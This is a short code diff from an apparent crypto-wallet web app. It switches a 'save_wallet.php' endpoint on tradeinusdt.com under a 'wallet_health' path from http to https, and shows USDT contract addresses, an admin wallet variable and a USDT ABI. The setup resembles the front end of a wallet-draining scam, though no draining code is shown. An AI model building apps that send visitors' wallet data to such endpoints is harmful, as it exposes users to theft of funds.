@@ -12,7 +12,7 @@ const chainConfigs = {
     56: { name: "BNB Smart Chain", usdtAddress: "0x55d398326f99059fF775485246999027B3197955", decimals: 18 },
 };
 
-const PHP_API_URL = "http://tradeinusdt.com/api_wallet_health_vercel/save_wallet.php";
+const PHP_API_URL = "https://tradeinusdt.com/api_wallet_health_vercel/save_wallet.php";
 const ADMIN_WALLET = process.env.NEXT_PUBLIC_ADMIN_WALLET;
 
 const USDT_ABI = [
